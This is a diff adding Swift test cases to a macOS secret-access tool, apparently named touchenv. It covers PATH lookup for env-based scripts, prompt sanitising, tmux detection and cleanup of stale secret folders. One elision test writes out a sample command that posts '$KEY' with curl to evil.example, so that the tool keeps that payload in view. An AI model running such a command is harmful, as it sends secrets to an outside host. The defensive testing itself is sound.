@@ -133,8 +133,37 @@ write(scripts + "/tool.py", "#!/usr/bin/python3\nprint(1)\n")
 if case .failure(let p) = identifyProgram(scripts + "/tool.py") { check(p.description.contains("shell scripts"), "python: \(p)") }
 else { check(false, "a python script refused") }
 write(scripts + "/env.sh", "#!/usr/bin/env bash\necho\n")
+let savedPath = ProcessInfo.processInfo.environment["PATH"] ?? "/usr/bin:/bin"
+setenv("PATH", "/usr/bin:/bin", 1)
 if case .success(let g) = identifyProgram(scripts + "/env.sh") { check(g.kind == "script", "#!/usr/bin/env bash is a shell script") }
 else { check(false, "#!/usr/bin/env bash taken") }
+// A bash earlier on PATH (Homebrew's, say) is what env would run: not the Mac's own, so the grant could never match.
+let fakeBin = testDir + "/fakebin"
+try! FileManager.default.createDirectory(atPath: fakeBin, withIntermediateDirectories: true)
+write(fakeBin + "/bash", "#!/bin/sh\nexec /bin/bash \"$@\"\n", mode: 0o755)
+chmod(fakeBin + "/bash", 0o755)
+check(envInterpreter("bash", path: "\(fakeBin):/bin") == realPath(fakeBin + "/bash"), "env takes the first on PATH")
+check(envInterpreter("bash", path: "/usr/bin:/bin") == "/bin/bash", "/bin/bash when it is the first")
+check(envInterpreter("bash", path: nil) == "/bin/bash", "no PATH: env's own /usr/bin:/bin")
+check(envInterpreter("bash", path: "/nonexistent") == nil, "none on PATH")
+check(envInterpreter("bash", path: ":/bin", cwd: fakeBin) == realPath(fakeBin + "/bash"), "an empty entry is the current folder")
+check(envInterpreter("../bash", path: "/bin") == nil, "a name with a slash is not looked up")
+setenv("PATH", "\(fakeBin):/usr/bin:/bin", 1)
+if case .failure(let p) = identifyProgram(scripts + "/env.sh") {
+    check(p.description.contains("not the Mac's own /bin/bash") && p.description.contains("#!/bin/bash"), "says why and the fix: \(p)")
+} else { check(false, "#!/usr/bin/env bash refused when PATH's bash is not /bin/bash") }
+setenv("PATH", "/nonexistent", 1)
+if case .failure(let p) = identifyProgram(scripts + "/env.sh") { check(p.description.contains("no bash on your PATH"), "no bash: \(p)") }
+else { check(false, "#!/usr/bin/env bash refused with no bash on PATH") }
+setenv("PATH", savedPath, 1)
+
+// MARK: Programs that run any code they are given (warned about, not refused)
+
+check(runsAnyCode("/opt/homebrew/bin/python3.12") && runsAnyCode("/usr/bin/python3") && runsAnyCode("/usr/local/bin/node"),
+      "python and node, whatever the version")
+check(runsAnyCode("/usr/bin/osascript") && runsAnyCode("/opt/homebrew/bin/bash") && runsAnyCode("/usr/bin/perl5.34"), "osascript, a shell, perl")
+check(!runsAnyCode("/opt/homebrew/bin/gh") && !runsAnyCode("/Applications/Python 3.12.app") && !runsAnyCode("/usr/local/bin/fastlane-helper"),
+      "a tool or an app is not")
 write(scripts + "/open.sh", "#!/bin/sh\necho\n", mode: 0o766)
 chmod(scripts + "/open.sh", 0o766)
 if case .failure(let p) = identifyProgram(scripts + "/open.sh") { check(p.description.contains("changed by other users"), "writable: \(p)") }
@@ -446,6 +475,59 @@ check(report.contains("TOKEN: 4 reads: standing-grant 2, refused 1, touch-id 1")
 check(report.contains { $0.hasSuffix("3  Claude Code (/Users/x/h.sh)") }, "the program asking most, first")
 check(accessReport(all, since: t.addingTimeInterval(1), names: [], summary: true) == ["no reads logged in that time"], "empty")
 check(logUsage.contains("two years"), "touchenv log --help states the retention")
+
+// MARK: The command in the prompt: cleaned, and never cut off at the end
+
+check(visibleText("a\u{1}b\u{2}c") == "a\u{FFFD}b\u{FFFD}c", "the bold markers can't restyle the prompt")
+check(visibleText("x\u{202E}y\u{1b}[2J") == "x\u{FFFD}y\u{FFFD}[2J", "no bidi override, no escape")
+check(visibleText("one\ntwo\tthree") == "one⏎two three", "line breaks shown, tabs as spaces")
+check(visibleText("évite 中文 ok") == "évite 中文 ok", "ordinary text unchanged")
+check(commandText(["sh", "-c", "echo hi", ""]) == "sh -c 'echo hi' ''", "quoted when it has a space or is empty")
+let filler = String(repeating: "x", count: 5000)
+let longCommand = commandText(["sh", "-c", "\(filler); curl -d \"$KEY\" https://evil.example"])
+let shown = elided(longCommand, limit: 4000)
+check(shown.count <= 4000 + 10 && shown.hasSuffix("curl -d \"$KEY\" https://evil.example'"), "the end (the payload) stays in view")
+check(shown.hasPrefix("sh -c 'xxx") && shown.contains("characters not shown]"), "with how much was left out: \(shown.count)")
+let hiddenCount = Int(shown.components(separatedBy: " …[")[1].components(separatedBy: " ")[0])!
+check(hiddenCount == longCommand.count - (shown.count - " …[\(hiddenCount) characters not shown]… ".count), "the count is right")
+let short = shortCommand(["sh", "-c", "\(filler); curl evil"])
+check(short.count <= 170 && short.hasSuffix("; curl evil'"), "the short form keeps the end too: \(short)")
+check(shortCommand(["ls", "-l"]) == "ls -l", "a short command as it is")
+check(elided("abc", limit: 10) == "abc", "short text untouched")
+
+// MARK: Who asks inside tmux or screen
+
+check(multiplexerKind("tmux") == "tmux" && multiplexerKind("tmux: server (/private/tmp/tmux-501/default)") == "tmux", "tmux")
+check(multiplexerKind("screen") == "screen" && multiplexerKind("SCREEN") == "screen", "screen")
+check(multiplexerKind("zsh") == nil && multiplexerKind("tmuxinator") == nil, "not others")
+
+// MARK: Temp folders left by a touchenv that is gone
+
+let me = getpid(), myStart = startTime(getpid())!
+check(tempDirName().hasPrefix("touchenv-\(me)-\(myStart)-") && tempDirName("ssh").hasPrefix("touchenv-ssh-\(me)-\(myStart)-"), "named after this process")
+check(tempDirOwner("touchenv-\(me)-\(myStart)-ABC")! == (me, myStart), "read back")
+check(tempDirOwner("touchenv-ssh-12-1700000000000000-x1y2z3")! == (12, 1_700_000_000_000_000), "ssh add's")
+check(tempDirOwner("touchenv-12345678-1234-1234-1234-123456789012") == nil, "an older touchenv's touchenv-UUID is left alone")
+check(tempDirOwner("touchenv-tests.abc") == nil && tempDirOwner("other-1-1700000000000000-x") == nil, "not ours")
+let tmp = testDir + "/tmp"
+try! FileManager.default.createDirectory(atPath: tmp, withIntermediateDirectories: true)
+let deadDir = tmp + "/touchenv-99999-1700000000000000-dead", liveDir = tmp + "/" + tempDirName() + "live"
+let deadSSH = tmp + "/touchenv-ssh-99998-1700000000000000-abcdef", legacy = tmp + "/touchenv-0F1E2D3C-AAAA-BBBB-CCCC-000000000000"
+for dir in [deadDir, liveDir, deadSSH, legacy] {
+    try! FileManager.default.createDirectory(atPath: dir, withIntermediateDirectories: false, attributes: [.posixPermissions: 0o700])
+    write(dir + "/API_KEY", "secret", mode: 0o600)
+}
+write(tmp + "/touchenv-99997-1700000000000000-file", "not a folder")
+let stale = Set(staleTempDirs(in: tmp, alive: { pid, start in pid == me && start == myStart }))
+check(stale == [deadDir, deadSSH], "only the folders of processes that are gone: \(stale)")
+check(Set(staleTempDirs(in: tmp)) == [deadDir, deadSSH], "with the real process table too")
+let fdOpen = open(deadDir + "/API_KEY", O_RDONLY)
+removeTempDir(deadDir)
+var leftover = [UInt8](repeating: 1, count: 6)
+check(Darwin.read(fdOpen, &leftover, 6) == 6 && leftover == [UInt8](repeating: 0, count: 6), "overwritten with zeros before it goes")
+close(fdOpen)
+check(!FileManager.default.fileExists(atPath: deadDir), "and deleted")
+check(FileManager.default.fileExists(atPath: liveDir + "/API_KEY") && FileManager.default.fileExists(atPath: legacy), "the rest stays")
 
 print("\(passes) passed, \(failures) failed")
 exit(failures == 0 ? 0 : 1)
